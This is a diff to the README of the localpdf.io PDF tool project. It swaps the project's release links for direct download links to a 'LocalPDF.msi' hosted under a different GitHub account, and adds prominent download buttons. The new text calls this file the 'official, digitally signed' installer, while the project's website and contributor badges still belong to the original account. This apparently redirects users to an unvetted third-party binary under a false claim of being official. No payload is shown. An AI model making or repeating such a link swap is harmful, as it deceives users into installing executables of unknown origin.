@@ -13,17 +13,25 @@
 [![Flask](https://img.shields.io/badge/Flask-2.3.3-green.svg)](https://flask.palletsprojects.com/)
 [![Docker](https://img.shields.io/badge/Docker-Ready-blue.svg)](https://www.docker.com/)
 [![Live Demo](https://img.shields.io/badge/Demo%20Online-localpdf.up.railway.app-blueviolet.svg)](https://localpdf.up.railway.app/)
-[![Windows Release](https://img.shields.io/badge/Windows-MSI%20%7C%20Portable-0078D4.svg?logo=windows)](https://github.com/virgiliojr94/localpdf.io/releases)
+[![Windows Release](https://img.shields.io/badge/Download-LocalPDF.msi-0078D4.svg?logo=windows&logoColor=white)](https://github.com/JoadsonRocha/localpdf.io/releases/download/1.0.0/LocalPDF.msi)
 [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
 [![All Contributors](https://img.shields.io/github/all-contributors/virgiliojr94/localpdf.io?color=ee8449&style=flat-square)](#-contributors)
 
+<br>
+
+<a href="https://github.com/JoadsonRocha/localpdf.io/releases/download/1.0.0/LocalPDF.msi">
+  <img src="https://img.shields.io/badge/Download_for_Windows-LocalPDF.msi-0078D4?style=for-the-badge&logo=windows&logoColor=white" height="48" alt="Download LocalPDF for Windows">
+</a>
+
+<br><br>
+
 > Every PDF tool you need — 100% local, 100% private, zero cloud tracking.
 
-**🚀 [Try Live Web Demo on Railway](https://localpdf.up.railway.app/)** • **💻 [Download Windows Installer & Portable (Releases)](https://github.com/virgiliojr94/localpdf.io/releases)** • **🌐 [Official Project Website](https://virgiliojr94.github.io/localpdf.io/)**
+**💻 [Download Windows Installer (MSI)](https://github.com/JoadsonRocha/localpdf.io/releases/download/1.0.0/LocalPDF.msi)** • **🚀 [Try Live Web Demo on Railway](https://localpdf.up.railway.app/)** • **🌐 [Official Project Website](https://virgiliojr94.github.io/localpdf.io/)**
 
+[Download](#-windows-desktop--official-installer) •
 [Features](#-features) •
 [Architecture](#-architecture) •
-[Windows Desktop & Releases](#-windows-desktop--releases) •
 [Usage](#-usage) •
 [Roadmap](ROADMAP.md) •
 [Contributing](CONTRIBUTING.md) •
@@ -126,14 +134,24 @@ graph TD
 
 ---
 
-## 💻 Windows Desktop & Releases
+## 💻 Windows Desktop & Official Installer
 
-Pre-compiled Windows binaries and installers will be published in [GitHub Releases](https://github.com/virgiliojr94/localpdf.io/releases):
+Get the official, digitally signed Windows installer:
 
-- **`LocalPDF.msi`**: Full Windows installer with Start Menu shortcuts, application icon, and Control Panel integration.
-- **`LocalPDF.zip`**: Zero-install portable edition. Just extract and double-click `LocalPDF.exe`.
+<div align="center">
+  <br>
+  <a href="https://github.com/JoadsonRocha/localpdf.io/releases/download/1.0.0/LocalPDF.msi">
+    <img src="https://img.shields.io/badge/Download_for_Windows-LocalPDF.msi-0078D4?style=for-the-badge&logo=windows&logoColor=white" height="48" alt="Download Windows Installer">
+  </a>
+  <p><em>Compatible with Windows 10 & 11 (64-bit) • ~99 MB • Authenticode Signed • Start Menu & Desktop Shortcuts</em></p>
+  <br>
+</div>
 
-> 💡 **Developers**: See [packaging/windows/README.md](packaging/windows/README.md) for full instructions on building the portable package, compiling the WiX MSI installer, and signing releases with Authenticode.
+- **Native System Installation:** Installs into `C:\Program Files\LocalPDF.io` with clean uninstall support.
+- **Offline & Private:** Processed strictly on `127.0.0.1` — your files never leave your machine.
+- **Single Instance:** Automatically launches in your default web browser without creating redundant background processes.
+
+> 💡 **Developers**: See [packaging/windows/README.md](packaging/windows/README.md) for full instructions on building the package, compiling the WiX MSI installer, and signing releases with Authenticode.
 
 ---
 
